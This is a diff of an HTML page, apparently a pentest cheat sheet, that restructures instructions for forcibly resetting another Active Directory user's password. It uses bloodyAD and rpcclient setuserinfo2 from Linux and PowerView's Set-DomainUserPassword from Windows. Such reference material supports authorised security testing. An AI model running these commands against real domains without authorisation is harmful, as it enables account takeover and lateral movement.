@@ -195,16 +195,36 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="abuse-1a-change-target-user-password">Abuse #1a: Change target user password</h3>
-<h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
+<h3 id="change-target-user-password-from-linux">Change target user password (From Linux)</h3>
+<p>
+<button data-tabset="set1" data-tabcontent="tab1" class="active">BloodyAD</button>
+
+<button data-tabset="set1" data-tabcontent="tab2" >rpcclient</button>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --host &lt;DC&gt; <span class="nb">set</span> password &lt;TARGET_USER&gt; &lt;NEW_PASSWORD&gt;
+</span></span></code></pre></div></div>
+<p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div>
+
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rpcclient -U <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USER&gt;%&lt;PASSWORD&gt;&#39;</span> &lt;TARGET&gt; -c <span class="s1">&#39;setuserinfo2 &lt;TARGET_USER&gt; 23 &lt;TARGET_USER_NEW_PASSWORD&gt;&#39;</span>
+</span></span></code></pre></div></div>
+</div></p>
+<h3 id="change-target-user-password-from-windows">Change target user password (From Windows)</h3>
+<p>
+<button data-tabset="set2" data-tabcontent="tab1" class="active">Windows</button>
+
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-import-powerviewps1">1. Import PowerView.ps1</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div><h4 id="2-change-target-user-password">2. Change Target User Password</h4>
+</span></span></code></pre></div></div>
+<h4 id="2-change-target-user-password">2. Change Target User Password</h4>
+<div>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$password</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="p">&lt;</span><span class="n">PASSWORD</span><span class="p">&gt;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span> 
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-DomainUserPassword</span> <span class="n">-Identity</span> <span class="p">&lt;</span><span class="n">TARGET_USER</span><span class="p">&gt;</span> <span class="n">-AccountPassword</span> <span class="nv">$password</span>
-</span></span></code></pre></div><h3 id="abuse-1b-change-target-user-password">Abuse #1b: Change target user password</h3>
-<h4 id="1-via-rpcclient">1. Via rpcclient</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rpcclient -U <span class="s1">&#39;&lt;DOMAIN&gt;/&lt;USER&gt;%&lt;PASSWORD&gt;&#39;</span> &lt;TARGET&gt; -c <span class="s1">&#39;setuserinfo2 &lt;TARGET_USER&gt; 23 &lt;TARGET_USER_NEW_PASSWORD&gt;&#39;</span>
-</span></span></code></pre></div><br></div></div>
+</span></span></code></pre></div></div>
+</div></p>
+<br></div></div>
     
     <script src="/js/utils.js"></script>
     <footer>
